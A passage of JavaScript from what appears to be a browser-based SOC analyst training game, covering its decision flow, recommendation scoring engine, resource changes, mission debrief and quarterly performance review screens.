    h.className = 'sim-onboard-step-title';
    h.textContent = s.title || '';
    const t = document.createElement('span');
    t.className = 'sim-onboard-step-text';
    t.textContent = s.text || '';
    li.appendChild(h);
    li.appendChild(t);
    stepsEl.appendChild(li);
  });
  const cta = ov.querySelector('#simOnboardCta');
  if (cta && ob.cta) cta.textContent = ob.cta;
  ov.hidden = false;
  SIM.onboardOpen = true;
  if (cta) { try { cta.focus(); } catch (_) { /* focus is best-effort */ } }
}

/* SINGLE dismissal chokepoint: hide the overlay and return focus to the command
 * line so the player can start typing immediately. */
function closeMissionOnboarding() {
  if (!SIM.onboardOpen) return;
  SIM.onboardOpen = false;
  if (simOnboardEl) simOnboardEl.hidden = true;
  const input = document.getElementById('simTermInput');
  if (input) { try { input.focus(); } catch (_) { /* focus is best-effort */ } }
}

function setClassification(fileName, value) {
  if (!simFileByName(fileName)) return;
  if (!CLASSIFICATIONS.some(c => c.id === value)) return;
  SIM.classified[fileName] = value;
  renderEvidencePanel();
  if (SIM.mapOpen) renderSimMap();   // keep the interactive map flag in sync
}

/* ------------------------------------------------------------------ *
 * Evidence-presentation handlers (Task #91) — PRESENTATION ONLY.
 * None of these touch resources, flags, classification, or scoring.
 * ------------------------------------------------------------------ */
function toggleEvidenceLayer(id, level) {
  if (!id) return;
  if (level === 'hide') delete SIM.evReveal[id];
  else if (level === 'analyst' || level === 'technical') SIM.evReveal[id] = level;
  renderEvidencePanel();
}

/* Tooltip toggle for tap/click — one open at a time. Hover + keyboard focus are
 * handled purely in CSS, so this only manages the tap-to-pin --open state. */
function toggleTerm(btn) {
  const wrap = btn.closest('.sim-term-wrap');
  if (!wrap) return;
  const wasOpen = wrap.classList.contains('sim-term-wrap--open');
  document.querySelectorAll('.sim-term-wrap--open').forEach(w => {
    w.classList.remove('sim-term-wrap--open');
    const b = w.querySelector('.sim-term');
    if (b) b.setAttribute('aria-expanded', 'false');
  });
  if (!wasOpen) {
    wrap.classList.add('sim-term-wrap--open');
    btn.setAttribute('aria-expanded', 'true');
  }
}

function toggleConcern(i) {
  if (!Number.isFinite(i)) return;
  if (SIM.reflection.concerns.has(i)) SIM.reflection.concerns.delete(i);
  else SIM.reflection.concerns.add(i);
  renderEvidencePanel();
}

function setJudgment(j) {
  if (!JUDGMENTS.includes(j)) return;
  SIM.reflection.judgment = j;
  renderEvidencePanel();
}

/* ================================================================== *
 * DECISION + CONSEQUENCE + LOCKED-AUTHORITY + RECOMMENDATION (P3)
 * ================================================================== */
function simRevealActions(manual) {
  if (SIM.stage === 'report') return;   // decision already made
  // Hard lock: never advance to the handling actions while Sarah still has a
  // pending call. The auto-reveal path (after the last file/core command) would
  // otherwise flip stage -> 'decision' and release the terminal lock with a
  // decision still unanswered. Keep the player in the investigation + dock until
  // it's answered; they then type `decide` to reveal the actions. (The typed
  // `decide` path can't reach here while locked — the input is disabled.)
  if (caseFileDecisionPending()) {
    syncDecisionDock();   // re-assert the dock + terminal lock (idempotent)
    return;
  }
  SIM.stage = 'decision';
  emitFeed('stage', 'Moved to the decision step.');   // Active Investigation Feed (Task #154)
  renderActions();
  renderEvidencePanel();   // refresh the feed + stage bar now that the stage changed
  if (manual && !investigationComplete()) {
    const msg = simFiles().length
      ? 'Note: you have not reviewed every file. Acting on incomplete evidence weakens your recommendation.'
      : 'Note: you have not finished the core investigation. Acting on incomplete evidence weakens your recommendation.';
    simPrint(msg, 'warn');
  }
}

function renderActions() {
  const host = document.getElementById('simActions');
  if (!host || !SIM.def) return;
  const actBtns = (SIM.def.actions || []).map(a => `
    <button type="button" class="sim-action-btn${a.type === 'recommendation' ? ' sim-action-btn--rec' : ''}" data-action="${a.id}">
      <span class="sim-action-btn-label">${a.label}</span>
      <span class="sim-action-btn-desc">${a.summary || ''}</span>
    </button>`).join('');
  const lockBtns = (SIM.def.lockedActions || []).map(a => `
    <button type="button" class="sim-action-btn sim-action-btn--locked" data-locked="${a.id}">
      <span class="sim-action-btn-label">${a.label}</span>
      <span class="sim-action-btn-desc">Beyond your current authority — see why.</span>
    </button>`).join('');
  host.innerHTML = `
    <div class="sim-actions-head">CHOOSE A HANDLING ACTION</div>
    <div class="sim-actions-grid">${actBtns}${lockBtns}</div>`;
}

function chooseAction(actionId) {
  if (SIM.stage === 'report') return;
  // Defense-in-depth for the hard lock: never let a handling action be chosen
  // while Sarah still has a pending call (with simRevealActions guarded these
  // buttons shouldn't even be visible yet, but never act on an unanswered call).
  if (caseFileDecisionPending()) {
    nudgeDecisionDock();
    return;
  }
  const action = (SIM.def.actions || []).find(a => a.id === actionId);
  if (!action) return;

  // Recommendation-type actions are judged by leadership: the outcome scales
  // their effect (or, if Denied, costs a little standing instead).
  let outcome = null;
  let deltas = { ...(action.deltas || {}) };
  if (action.type === 'recommendation') {
    outcome = computeRecommendationOutcome();
    if (outcome.verdict === 'Denied') deltas = { careerReputation: -5, executiveTrust: -4, complianceExposure: 5 };
    else deltas = mergeDeltas(scaleDeltas(deltas, outcome.multiplier), verdictStandingDeltas(outcome.verdict));
  }
  // Fold in any dynamic carry-flag deltas (UNSCALED) so prior-mission
  // consequences move resources without distorting the leadership verdict.
  const changes = applyResourceDeltas(mergeDeltas(deltas, dynamicDeltaMods(SIM.dynamic)));
  const denied = outcome && outcome.verdict === 'Denied';
  if (!denied) (action.setFlags || []).forEach(f => setMissionFlag(f, true));

  SIM.decision = { actionId, outcome, changes };
  SIM.stage = 'report';
  const dock = document.getElementById('simActions');
  if (dock) dock.innerHTML = `<p class="sim-empty">Decision recorded: <strong>${action.label}</strong>. See the debrief →</p>`;
  simEndTermGroup();                        // button-click result, not a typed command — render ungrouped
  simPrint(`> Decision: ${action.label}${outcome ? ' — ' + outcome.verdict : ''}`, 'ok');
  applyDecisionConsequence(actionId); // #120 — posture-driven ripples (dials/postcards/scars), before debrief reads SIM.consequence
  emitFeed('decision', 'Decision submitted: ' + action.label + '.');   // Active Investigation Feed (Task #154)
  emitFeed('complete', 'Case closed — debrief ready.');
  renderEvidencePanel();   // surface the decision/completion feed entries before the debrief
  renderDebrief(action, outcome, changes);
  finalizeMission({ decisionLabel: action.label, decisionKind: action.type || 'direct', verdict: outcome ? outcome.verdict : null, changes });
}

function chooseLockedAction(id) {
  // Hard lock: don't surface the locked-action / alternative-recommendation
  // path while Sarah still has a pending call.
  if (caseFileDecisionPending()) { nudgeDecisionDock(); return; }
  const a = (SIM.def.lockedActions || []).find(x => x.id === id);
  if (!a) return;
  const host = document.getElementById('simFeedback');
  if (!host) return;
  const recId = a.alternativeRecommendationId;
  const rec = recId ? (SIM.def.recommendations || {})[recId] : null;
  host.innerHTML = `
    <div class="sim-panel-head">FEEDBACK &amp; CONSEQUENCE</div>
    <div class="sim-feedback-body">
      <div class="sim-locked-note">
        <div class="sim-locked-title">ACTION LOCKED — ${a.label}</div>
        <div class="sim-locked-why">${a.reason}</div>
        ${rec ? `<button type="button" class="sim-locked-alt" data-rec="${recId}">Alternative available — Submit Recommendation: ${rec.label}</button>` : ''}
      </div>
    </div>`;
  setFeedbackPanelHidden(false); // a locked-action note must surface even pre-decision (simple mode)
}

function submitRecommendation(recId) {
  if (SIM.stage === 'report') return;
  // Hard lock: never finalize a recommendation while Sarah has a pending call.
  if (caseFileDecisionPending()) { nudgeDecisionDock(); return; }
  const rec = (SIM.def.recommendations || {})[recId];
  if (!rec) return;
  const outcome = computeRecommendationOutcome();
  let deltas;
  if (outcome.verdict === 'Denied') deltas = { careerReputation: -5, executiveTrust: -4, complianceExposure: 5 };
  else deltas = mergeDeltas(scaleDeltas(rec.deltas || {}, outcome.multiplier), verdictStandingDeltas(outcome.verdict));
  // Fold in any dynamic carry-flag deltas (UNSCALED) — see chooseAction.
  const changes = applyResourceDeltas(mergeDeltas(deltas, dynamicDeltaMods(SIM.dynamic)));
  if (outcome.verdict !== 'Denied') (rec.setFlags || []).forEach(f => setMissionFlag(f, true));

  SIM.decision = { recommendationId: recId, outcome, changes };
  SIM.stage = 'report';
  const dock = document.getElementById('simActions');
  if (dock) dock.innerHTML = `<p class="sim-empty">Recommendation submitted: <strong>${rec.label}</strong>. See the debrief →</p>`;
  simEndTermGroup();                        // button-click result, not a typed command — render ungrouped
  simPrint(`> Recommendation submitted: ${rec.label} — ${outcome.verdict}`, 'ok');
  applyDecisionConsequence(recId); // #120 — posture-driven ripples, before debrief reads SIM.consequence
  emitFeed('decision', 'Recommendation submitted: ' + rec.label + '.');   // Active Investigation Feed (Task #154)
  emitFeed('complete', 'Case closed — debrief ready.');
  renderEvidencePanel();   // surface the decision/completion feed entries before the debrief
  renderDebrief(
    { label: 'Recommendation: ' + rec.label, consequence: rec.consequence, setFlags: rec.setFlags, deniedNote: rec.deniedNote, outcomeSub: 'Submitted to leadership for a decision.' },
    outcome, changes
  );
  finalizeMission({ decisionLabel: rec.label, decisionKind: 'recommendation', verdict: outcome.verdict, changes });
}

/* RECOMMENDATION ENGINE — outcome from evidence quality + severity + executive
 * trust + career reputation + timing (evidence gathered before deciding). */
function computeRecommendationOutcome() {
  const q = evidenceQuality();
  // Accuracy is the mission's "did you get the right answer" input. File-model
  // missions (M1) use classification accuracy; command-model missions use the
  // single identification; a mission with neither falls back to evidence quality.
  // For M1 (files present) this is identical to the original classificationQuality().
  const accuracy = simFiles().length ? classificationQuality()
    : (SIM.def && SIM.def.identify) ? identificationQuality()
    : evidenceQuality();
  const timing = SIM.evidence.size > 0 ? 1 : 0;
  const sev = (SIM.def && SIM.def.severity) || 'MEDIUM';
  const sevBoost = sev === 'CRITICAL' ? 4 : sev === 'HIGH' ? 4 : sev === 'MEDIUM' ? 2 : 0;
  // The verdict TIER must reflect how well the analyst actually performed, so the
  // two skill signals — getting the right answer (classify / identify) and the
  // graded discovery judgments — carry the majority of the score. Everything else
  // (evidence surfaced, standing, timing, investigation completeness, severity) is
  // a small modifier, not a floor, so a thorough-but-inaccurate run (e.g. ~71%
  // classification / ~50% discovery) lands BELOW "Approved" instead of being
  // floated over the line by baseline credit.
  const jq = judgmentQualityAll();                   // null when no discovery challenges
  let score = 0;
  if (jq == null) {
    score += accuracy * 48;                          // correct answer carries it (no graded judgments here)
    score += q * 22;                                 // evidence surfaced
  } else {
    score += accuracy * 40;                          // correct classification / identification
    score += jq * 30;                                // graded discovery judgments
    score += q * 10;                                 // evidence surfaced
  }
  // Earned standing is a SMALL nudge only (cap ~+6 combined) — deliberately too
  // small to lift a weak-skill run (e.g. ~71% / ~50%) across the "Approved"
  // line even for a maxed-out veteran, so the verdict tier stays skill-driven.
  score += (CAREER.executiveTrust / 100) * 4;        // benefit of the doubt — never threshold-crossing
  score += (CAREER.careerReputation / 100) * 2;
  score += timing ? 3 : 0;
  score += investigationComplete() ? 3 : 0;          // M1: allFileEvidenceSurfaced(); M2+: coreCommandsRun()
  score += sevBoost;
  let verdict, multiplier;
  if (score >= 70)      { verdict = 'Approved';            multiplier = 1;   }
  else if (score >= 50) { verdict = 'Partially Approved';  multiplier = 0.6; }
  else if (score >= 30) { verdict = 'Deferred';            multiplier = 0.3; }
  else                  { verdict = 'Denied';              multiplier = 0;   }
  return { verdict, multiplier, score: Math.round(score), evidenceQuality: q, classificationQuality: accuracy, judgmentQuality: jq };
}

function scaleDeltas(deltas, m) {
  const out = {};
  Object.keys(deltas).forEach(k => { out[k] = Math.round(deltas[k] * m); });
  return out;
}

// Standing swing layered ON TOP of the (multiplier-scaled) action deltas for a
// recommendation, so the leadership verdict itself moves the headline gauges:
// a strong call earns trust/reputation, a weak one is a quiet setback, and a
// barely-supported one actively erodes standing and raises compliance exposure.
// Denied is handled by its own replacement penalty at the call sites, so it gets
// nothing here. Summed via mergeDeltas (which adds shared keys), then clamped by
// applyResourceDeltas. Keeps the gauges presentation-only — this only touches
// the six underlying resources, never the gauges directly.
function verdictStandingDeltas(verdict) {
  switch (verdict) {
    case 'Approved':           return { executiveTrust: 5, careerReputation: 4 };
    // The businessContinuity / organizationBudget hits are intentional: an
    // action's own business cost scales DOWN with a weaker multiplier, which on
    // its own would make a weak verdict read as *less* business damage. These
    // penalties more than offset that so the Business Impact gauge moves in the
    // right direction — strong play preserves it best, weak play erodes it.
    case 'Partially Approved': return { executiveTrust: -2, careerReputation: -1, complianceExposure: 3, businessContinuity: -4, organizationBudget: -4000 };
    case 'Deferred':           return { executiveTrust: -6, careerReputation: -4, complianceExposure: 6, businessContinuity: -8, organizationBudget: -8000 };
    default:                   return {}; // Denied: handled by the call-site penalty
  }
}

function recommendationReason(o) {
  const ev = Math.round(o.evidenceQuality * 100);
  const cl = Math.round((o.classificationQuality || 0) * 100);
  if (simFiles().length) {
    // FILE-MODEL (Mission 1). On challenge missions, also credit graded judgments.
    const jc = (o.judgmentQuality != null) ? `, ${Math.round(o.judgmentQuality * 100)}% of discovery judgments correct` : '';
    if (o.verdict === 'Approved')           return `Strong, well-evidenced case — ${ev}% of evidence gathered, ${cl}% of files classified correctly${jc}. Leadership approved it in full.`;
    if (o.verdict === 'Partially Approved') return `Reasonable case — ${ev}% evidence, ${cl}% classified correctly${jc}. Leadership approved part of it, pending tighter work.`;
    if (o.verdict === 'Deferred')           return `Thin work — ${ev}% evidence, ${cl}% classified correctly${jc}. Leadership deferred the decision for now.`;
    return `Insufficient case — ${ev}% evidence, ${cl}% classified correctly${jc}. Leadership declined — investigate and classify before recommending.`;
  }
  // COMMAND-MODEL (Mission 2+) — accuracy is the identification, not classification.
  const idOk = (SIM.def && SIM.def.identify) ? identificationQuality() === 1 : null;
  const accLabel = idOk === null ? `${cl}% accuracy`
    : idOk ? 'the right target identified' : 'the wrong target identified';
  if (o.verdict === 'Approved')           return `Strong, well-evidenced case — ${ev}% of evidence gathered, ${accLabel}. Leadership approved it in full.`;
  if (o.verdict === 'Partially Approved') return `Reasonable case — ${ev}% evidence, ${accLabel}. Leadership approved part of it, pending tighter work.`;
  if (o.verdict === 'Deferred')           return `Thin work — ${ev}% evidence, ${accLabel}. Leadership deferred the decision for now.`;
  return `Insufficient case — ${ev}% evidence, ${accLabel}. Leadership declined — gather evidence and confirm the target before recommending.`;
}

/* CONSEQUENCE + REPORT — Immediate / Business / Resource / Future, plus the
 * mission debrief (verdict, carry-forward flags, classification review). */
function conseqBlock(kind, label, lines) {
  const body = (Array.isArray(lines) ? lines : [lines])
    .map(l => `<div class="sim-conseq-text">${l}</div>`).join('');
  return `<div class="sim-conseq-block"><div class="sim-conseq-label sim-conseq-label--${kind}">${label}</div>${body}</div>`;
}

/* CAMPAIGN RECONSTRUCTION (Mission 4 capstone) — replay the four cases as one
 * adversary campaign in PLAIN LANGUAGE (the contractor → the device → the account
 * → the data transfer). Never expose attacker-lifecycle jargon to the student.
 * Data-gated on def.campaignReveal; presentation-only (reads nothing mutable). */
function campaignRevealHtml(r) {
  const chain = (Array.isArray(r.chain) ? r.chain : []).map((s, i) => `
    <li class="sim-campaign-stage">
      <span class="sim-campaign-step">${i + 1}</span>
      <div class="sim-campaign-stage-body">
        <div class="sim-campaign-stage-head"><span class="sim-campaign-op">${s.op || ''}</span><span class="sim-campaign-tag">${s.stage || ''}</span></div>
        <div class="sim-campaign-line">${s.line || ''}</div>
      </div>
    </li>`).join('');
  return `
    <div class="sim-campaign">
      <div class="sim-campaign-head">${r.title || 'CAMPAIGN RECONSTRUCTION'}</div>
      ${r.intro ? `<p class="sim-campaign-intro">${r.intro}</p>` : ''}
      <ol class="sim-campaign-chain">${chain}</ol>
      ${r.closer ? `<p class="sim-campaign-closer">${r.closer}</p>` : ''}
    </div>`;
}

/* Tone for a resource value in the performance review: green/amber/red bands.
 * Money + higher-better metrics share a "more is better" rule; complianceExposure
 * (lower is better) is inverted. */
function reviewResourceTone(d, v) {
  if (d.kind === 'money') return v >= 40000 ? 'good' : v >= 20000 ? 'warn' : 'low';
  if (d.higherBetter) return v >= 70 ? 'good' : v >= 40 ? 'warn' : 'low';
  return v <= 15 ? 'good' : v <= 40 ? 'warn' : 'low';
}

/* Gather the normalized 0..1 investigation signals the performance review grades.
 * PREVIEW-ONLY: reads game state through existing helpers, mutates nothing. */
function performanceSignals() {
  const eq = evidenceQuality();
  const evDefs = simEvidenceDefs().length;
  const observation = evDefs ? Math.min(1, SIM.evidence.size / evDefs) : eq;

  // Recommendation accuracy: file-model missions grade classification, command-
  // model missions grade the single identification, otherwise fall back to eq.
  let recommendation;
  if (simFiles().length) recommendation = classificationQuality();
  else if (SIM.def && SIM.def.identify) recommendation = SIM.identified === SIM.def.identify.correctId ? 1 : (SIM.identified ? 0.25 : 0);
  else recommendation = eq;

  const risks = (SIM.def && SIM.def.risks) || [];
  const risk = risks.length ? risks.filter(riskConfirmed).length / risks.length : eq;

  // Documentation = how far the notebook (hypotheses + open questions) moved.
  const nb = (SIM.def && SIM.def.notebook) || {};
  const hyp = Array.isArray(nb.hypotheses) ? nb.hypotheses : [];
  const unk = Array.isArray(nb.unknowns) ? nb.unknowns : [];
  let documentation = eq;
  if (hyp.length || unk.length) {
    const hypOn = hyp.filter(h => (h.triggeredBy || []).some(id => SIM.evidence.has(id))).length;
    const unkOn = unk.filter(u => (u.resolvedBy || []).some(id => SIM.evidence.has(id))).length;
    documentation = (hypOn + unkOn) / (hyp.length + unk.length);
  }

  return {
    observation,
    evidence: eq,
    investigation: investigationConfidence() / 100,
    documentation,
    escalation: escalationSignal(),
    recommendation,
    risk,
    business: businessSignal(),
  };
}

/* Escalation quality from the carry-flags raised across the arc: containment /
 * escalation / legal flags read as sound judgement; ignored-thread / left-active
 * flags read as missed escalations. Baseline 0.5 so a quiet case is "developing". */
function escalationSignal() {
  const flags = CAREER.missionFlags || {};
  const good = ['legalReviewTriggered', 'incidentResponseEscalated', 'mfaRecommended',
    'rogueDeviceContained', 'exfilContained', 'customerNotificationRecommended'];
  const bad = ['contractorAccessIgnored', 'rogueDeviceActive', 'sensitiveDataExposed'];
  let score = 0.5;
  good.forEach(k => { if (flags[k]) score += 0.12; });
  bad.forEach(k => { if (flags[k]) score -= 0.18; });
  return Math.max(0, Math.min(1, score));
}

/* Business awareness from the organization's resource health — the same tones the
 * review prints: each healthy resource lifts the score, each strained one lowers it. */
function businessSignal() {
  const tones = RESOURCE_DEFS.map(d => reviewResourceTone(d, CAREER[d.key]));
  if (!tones.length) return 0.5;
  const pts = tones.reduce((s, t) => s + (t === 'good' ? 1 : t === 'warn' ? 0.5 : 0), 0);
  return pts / tones.length;
}

/* QUARTERLY PERFORMANCE REVIEW (Mission 4 capstone). Grades this analyst across
 * the role spec's eight quality dimensions, awards an overall standing tier
 * (Needs Additional Training → Junior SOC Analyst Candidate), reports the
 * organization's health, and — at a top standing — confers the REAL Intern→Junior
 * promotion (see promotionDecision; persisted by finalizeMission). This render
 * computes the decision only to phrase Reyes's message; it mutates nothing. */
function performanceReviewHtml() {
  const cur = activeRole();
  const next = CAREER_ROLES.find(r => r.authorityLevel === cur.authorityLevel + 1);
  const review = performanceReview(performanceSignals());

  const qLines = review.dimensions.map(d =>
    `<li class="sim-review-quality sim-review-quality--${d.tone}"><span class="sim-review-quality-name">${d.label}</span><span class="sim-review-quality-rating">${d.rating}</span></li>`
  ).join('');

  const st = review.standing;
  const standing = `
    <div class="sim-review-standing sim-review-standing--${st.tone}">
      <div class="sim-review-standing-label">QUARTER RESULT</div>
      <div class="sim-review-standing-tier">${st.label}</div>
      <div class="sim-review-standing-note">${st.note}</div>
    </div>`;

  const resLines = RESOURCE_DEFS.map(d => {
    const v = CAREER[d.key];
    const tone = reviewResourceTone(d, v);
    const disp = d.kind === 'money' ? '$' + Number(v).toLocaleString('en-US') : v + '%';
    return `<li class="sim-review-metric sim-review-metric--${tone}"><span class="sim-review-metric-name">${d.label}</span><span class="sim-review-metric-val">${disp}</span></li>`;
  }).join('');

  const completed = Array.isArray(CAREER.completedMissions) ? CAREER.completedMissions.length : 0;

  // PROMOTION PAYOFF (Task #108) — the capstone review now earns a REAL promotion.
  // Compute the decision fresh here for the message; finalizeMission() applies the
  // same pure decision to persist it. renderDebrief runs BEFORE finalizeMission, so
  // `cur` is still the pre-promotion role at render time — the message reads as the
  // promotion being conferred now.
  const decision = promotionDecision({ currentRoleId: cur.id, average: review.average, nextRoleId: next && next.id });
  let preview;
  if (decision.promoted && next) {
    preview = `<div class="sim-review-next sim-review-next--promoted">
        <div class="sim-review-next-label">PROMOTION EARNED</div>
        <div class="sim-review-next-role">${next.title}</div>
        <div class="sim-review-next-dept">${next.department || ''}</div>
        <div class="sim-review-promo-note"><strong>Sarah Reyes:</strong> You have earned it. Effective now, you are promoted from ${cur.title} to ${next.title} — clearance and responsibilities updated. Proud to have you on the team.</div>
      </div>`;
  } else if (decision.alreadyEarned) {
    preview = `<div class="sim-review-next">
        <div class="sim-review-next-label">CURRENT STANDING</div>
        <div class="sim-review-next-role">${cur.title}</div>
        <div class="sim-review-next-note">You hold the rank of ${cur.title}. Strong, dependable work — keep it up.</div>
      </div>`;
  } else if (next) {
    preview = `<div class="sim-review-next">
        <div class="sim-review-next-label">NEXT ON THE LADDER</div>
        <div class="sim-review-next-role">${next.title}</div>
        <div class="sim-review-next-dept">${next.department || ''}</div>
        <div class="sim-review-next-note"><strong>Sarah Reyes:</strong> The promotion to ${next.title} is within reach — reach a top quarter standing and it is yours. Widen your evidence and sharpen your final calls.</div>
      </div>`;
  } else {
    preview = `<div class="sim-review-next"><div class="sim-review-next-note">You are at the top of the current ladder.</div></div>`;
  }
  return `
    <div class="sim-review">
      <div class="sim-review-head">QUARTERLY PERFORMANCE REVIEW</div>
      <div class="sim-review-role">Current role: <strong>${cur.title}</strong> · Cases closed: ${completed}</div>
      ${standing}
      <div class="sim-review-section-label">ANALYST QUALITY</div>
      <ul class="sim-review-qualities">${qLines}</ul>
      <div class="sim-review-section-label">ORGANIZATIONAL HEALTH</div>
      <ul class="sim-review-metrics">${resLines}</ul>
      ${preview}
    </div>`;
}

/* CELEBRATORY COMPLETION MOMENT (presentation-only) — a brief, auto-dismissing
 * toast shown when the mission debrief renders, so finishing reads as a reward
 * and the player immediately knows the mission is over. Never persists, scores,
 * or blocks the RETURN button. Guarded by SIM.runToken so it can't linger across
 * missions, and removed on mission open / return for safety. */
function simRemoveCompleteToast() {
  const t = document.getElementById('simCompleteToast');
  if (t && t.parentNode) t.parentNode.removeChild(t);
}
function simCelebrateComplete() {
  simRemoveCompleteToast();
  if (!document.body) return;
  const el = document.createElement('div');
  el.id = 'simCompleteToast';
  el.className = 'sim-complete-toast';
  el.setAttribute('role', 'status');
  el.setAttribute('aria-live', 'polite');
  el.innerHTML =
    '<div class="sim-complete-toast-badge">\u2713</div>' +
    '<div class="sim-complete-toast-text">' +
      '<div class="sim-complete-toast-title">MISSION COMPLETE</div>' +
      '<div class="sim-complete-toast-sub">Debrief ready \u2014 review it, then return to the Operations Center.</div>' +
    '</div>';
  document.body.appendChild(el);
  requestAnimationFrame(() => el.classList.add('is-in'));
  const token = SIM.runToken;
  // Operate only on THIS element (never a global by-id remove): if another
  // mission completes within the window, an old timer must not kill the newer
  // toast. open/return cleanup already detaches the active toast by id.
  setTimeout(() => {
    if (!el.parentNode) return;                          // already cleared (return / new mission)
    if (SIM.runToken !== token) { el.remove(); return; } // stale across missions — remove just this one
    el.classList.add('is-out');
    setTimeout(() => { if (el.parentNode) el.remove(); }, 460);
  }, 2600);
}

function renderDebrief(action, outcome, changes) {
  const host = document.getElementById('simFeedback');
  if (!host) return;
  const c = action.consequence || {};
  const denied = outcome && outcome.verdict === 'Denied';

  let html = `
    <div class="sim-complete-head">
      <span class="sim-complete-head-badge">\u2713</span>
      <span class="sim-complete-head-text">
        <span class="sim-complete-head-title">MISSION COMPLETE</span>
        <span class="sim-complete-head-sub">Debrief below \u00b7 return when ready</span>
      </span>
    </div>
    <div class="sim-feedback-body">`;
  html += `<div class="sim-conseq">`;
  html += `<div class="sim-conseq-title">${action.label}</div>`;
  html += `<div class="sim-conseq-sub">${action.outcomeSub || 'Decision recorded.'}</div>`;

  if (outcome) {
    const cls = outcome.verdict === 'Approved' ? 'approved'
      : outcome.verdict === 'Partially Approved' ? 'partial'
      : outcome.verdict === 'Deferred' ? 'deferred' : 'denied';
    html += `<div class="sim-rec-outcome sim-rec-outcome--${cls}">
      <div class="sim-rec-verdict">LEADERSHIP VERDICT: ${outcome.verdict.toUpperCase()}</div>
      <div class="sim-rec-reason">${recommendationReason(outcome)}</div></div>`;
  }

  if (!denied) {
    if (c.immediate) html += conseqBlock('immediate', 'Immediate Impact', c.immediate);
    if (c.business)  html += conseqBlock('business', 'Business Impact', c.business);
  } else if (action.deniedNote) {
    html += conseqBlock('immediate', 'Immediate Impact', action.deniedNote);
  }

  // Resource changes
  html += `<div class="sim-conseq-block"><div class="sim-conseq-label sim-conseq-label--resource">Resource Changes</div><ul class="sim-conseq-changes">`;
  const moved = changes.filter(ch => ch.after !== ch.before);
  if (moved.length) {
    moved.forEach(ch => {
      const def = RESOURCE_DEFS.find(d => d.key === ch.key);
      const diff = ch.after - ch.before;
      const dir = diff > 0 ? 'up' : diff < 0 ? 'down' : 'flat';
      const disp = def.kind === 'money'
        ? (diff >= 0 ? '+' : '−') + '$' + Math.abs(diff).toLocaleString('en-US')
        : (diff > 0 ? '+' : '') + diff;
      html += `<li class="sim-conseq-change"><span class="sim-conseq-change-name">${def.label}</span><span class="sim-conseq-change-delta--${dir}">${disp}</span></li>`;
    });
  } else {
    html += `<li class="sim-conseq-change"><span class="sim-conseq-change-name">No net resource change</span><span class="sim-conseq-change-delta--flat">—</span></li>`;
  }
  html += `</ul></div>`;

  if (!denied && c.future) html += conseqBlock('future', 'Future Impact', c.future);
  html += `</div>`; // .sim-conseq

  // CASE CONTINUITY — CARRIED FORWARD: plain-language note of how each active
  // dynamic condition (a prior-mission decision) changed THIS outcome. Present
  // only when carry-flags activated a condition; the resource deltas they cause
  // already show in Resource Changes above.
  const notes = outcomeNotes(SIM.dynamic);
  if (notes.length) {
    html += `<div class="sim-cont-impact">
      <div class="sim-conseq-label sim-conseq-label--future">CASE CONTINUITY — CARRIED FORWARD</div>
      <ul class="sim-cont-impact-list">
        ${notes.map(n => `<li class="sim-cont-impact-item sim-cont-impact-item--${n.tone}">${n.text}</li>`).join('')}
      </ul></div>`;
  }

  // CAMPAIGN REVEAL + PERFORMANCE REVIEW — Mission 4 capstone beats. Both are
  // presentation-only: they read state but never touch scoring/resources/role/
  // completedMissions. Data-gated, so earlier missions are unaffected.
  const reveal = SIM.def && SIM.def.campaignReveal;
  if (reveal) html += campaignRevealHtml(reveal);
  if (SIM.def && SIM.def.performanceReview) html += performanceReviewHtml();

  // END-OF-MISSION FORESHADOWING (presentation-only) — a short diegetic artifact
  // that seeds a question for the next assignment. Data-gated on def.foreshadow.
  if (SIM.def && SIM.def.foreshadow) html += foreshadowCardHtml(SIM.def.foreshadow);

  // #124 Sarah's end-of-mission read on the player (presentation-only; no score).
  html += performanceMirrorHtml();
  html += reportSectionHtml();
  html += consequenceTradeoffHtml(); // #120 (D) one reversible micro-tradeoff texture (additive, never blocks RETURN)
  html += `</div>`; // .sim-feedback-body
  // Pinned footer: the RETURN button lives OUTSIDE the scrolling body so it's
  // always visible without scrolling the debrief (the panel is height-bounded).
  html += `<div class="sim-feedback-foot"><button type="button" class="sim-report-done" data-done="1">RETURN TO OPERATIONS CENTER</button></div>`;
  host.innerHTML = html;
  setFeedbackPanelHidden(false); // a decision was made — reveal the panel in simple mode
  simCelebrateComplete();        // celebratory, auto-dismissing "mission complete" beat (presentation-only)
}

/* Carry-forward flags for the active mission. Each mission may define its own
 * `carryFlags:[{key,label}]`; the legacy CANON_FLAGS/FLAG_LABELS are the fallback
 * so Mission 1 (and any un-migrated mission) still reports correctly. */
function missionCarryFlags() {
  const def = SIM.def;
  if (def && Array.isArray(def.carryFlags) && def.carryFlags.length) return def.carryFlags;
  return CANON_FLAGS.map(k => ({ key: k, label: FLAG_LABELS[k] || k }));
}

function reportSectionHtml() {
  const setFlags = missionCarryFlags().filter(f => CAREER.missionFlags[f.key]);
  const flagItems = setFlags.length
    ? setFlags.map(f => `<li class="sim-report-flag"><span class="sim-report-flag-icon">▸</span><span>${f.label}</span></li>`).join('')
    : `<li class="sim-report-flag"><span class="sim-report-flag-icon">▸</span><span>No carry-forward flags raised.</span></li>`;

  // Accuracy review — GRADED: this feeds the recommendation outcome. File-model
  // missions (M1) review classification; command-model missions review the single
  // identification (which device / which account). Missions with neither skip it.
  let reviewHtml = '';
  const files = simFiles();
  if (files.length) {
    const correct = files.filter(f => SIM.classified[f.name] === f.trueClassification).length;
    const accPct = Math.round((correct / files.length) * 100);
    const rows = files.map(f => {
      const chosen = SIM.classified[f.name];
      const mark = !chosen ? '—' : (chosen === f.trueClassification ? '✓' : '✗');
      return `<li class="sim-report-flag"><span class="sim-report-flag-icon">${mark}</span><span>${f.name} — should be <strong>${classLabel(f.trueClassification)}</strong>${chosen ? ` · you marked ${classLabel(chosen)}` : ' · unclassified'}</span></li>`;
    }).join('');
    reviewHtml = `
      <div class="sim-report-section">
        <div class="sim-conseq-label sim-conseq-label--business">CLASSIFICATION REVIEW — ${correct}/${files.length} correct (${accPct}%)</div>
        <ul class="sim-report-flags">${rows}</ul>
      </div>`;
  } else if (SIM.def && SIM.def.identify) {
    const idf = SIM.def.identify;
    const opts = idf.options || [];
    const chosenOpt = opts.find(o => o.id === SIM.identified);
    const correctOpt = opts.find(o => o.id === idf.correctId);
    const ok = SIM.identified === idf.correctId;
    const mark = !SIM.identified ? '—' : (ok ? '✓' : '✗');
    reviewHtml = `
      <div class="sim-report-section">
        <div class="sim-conseq-label sim-conseq-label--business">IDENTIFICATION REVIEW</div>
        <ul class="sim-report-flags">
